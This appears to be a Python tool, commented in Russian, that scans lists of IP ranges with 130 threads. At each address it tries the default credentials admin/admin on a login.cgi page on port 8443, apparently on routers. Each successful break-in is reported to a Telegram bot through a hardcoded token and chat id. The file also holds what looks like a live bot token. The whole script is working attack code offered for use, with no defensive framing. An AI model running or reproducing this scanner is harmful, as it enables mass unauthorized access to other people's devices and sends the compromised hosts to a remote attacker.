import requests
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import ConnectTimeoutError


TOKEN = '6741660479:AAH91nQ2kIXbsva6NQEMpRNldhfS7vPP8Wc'
chat_id = "1365132609"

def check_login(args):
    ip_range, username, password, success_file, output_file = args
    ip_start, ip_end = map(str.strip, ip_range.split('-'))
    ip_range_list = [f"{ip_start[:ip_start.rindex('.')]}.{i}" for i in range(int(ip_start[ip_start.rindex('.')+1:]), int(ip_end[ip_end.rindex('.')+1:])+1)]

    for ip in ip_range_list:
        url = f"https://{ip}:8443/login.cgi"
        payload = {
            "login_username": username,
            "login_passwd": password
        }

        try:
            response = requests.post(url, data=payload, verify=False, timeout=5)
            response.raise_for_status()

            success_message = f"IP {ip}: Вход успешен\n"
            error_message = f"IP {ip}: Ошибка входа\n"

            if "Main_Login.asp" not in response.text:
                print(success_message)
                url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={success_message}"
                print(requests.get(url).json())
                with open(output_file, 'a', encoding='utf-8') as f_output:
                    f_output.write(success_message)
                with open(success_file, 'a', encoding='utf-8') as f_success:
                    f_success.write(success_message)
            else:
                print(error_message)
                with open(output_file, 'a', encoding='utf-8') as f_output:
                    f_output.write(error_message)

        except requests.exceptions.SSLError as e:
            error_message = f"IP {ip}: Ошибка SSL - {e}\n"
            print(error_message)
            with open(output_file, 'a', encoding='utf-8') as f_output:
                f_output.write(error_message)
        except ConnectTimeoutError as e:
            error_message = f"IP {ip}: Время ожидания подключения истекло - {e}\n"
            print(error_message)
            with open(output_file, 'a', encoding='utf-8') as f_output:
                f_output.write(error_message)
        except requests.RequestException as e:
            error_message = f"IP {ip}: Ошибка запроса - {e}\n"
            print(error_message)
            with open(output_file, 'a', encoding='utf-8') as f_output:
                f_output.write(error_message)

def process_ranges(ip_ranges_file, username, password, success_file, output_file):
    with open(ip_ranges_file, 'r', encoding='utf-8') as f:
        ip_ranges = [line.strip() for line in f]

    with ThreadPoolExecutor(max_workers=130) as executor:
        args = ((ip_range, username, password, success_file, output_file) for ip_range in ip_ranges)
        executor.map(check_login, args)

def main():
    success_file = "successful_logins.txt"
    output_file = "all_results.txt"
    username = "admin"
    password = "admin"
    ip_ranges_file = "sorted.txt"  # Замените на имя вашего файла с диапазонами IP
    process_ranges(ip_ranges_file, username, password, success_file, output_file) # перебор диапазонов

if __name__ == "__main__":
    main()
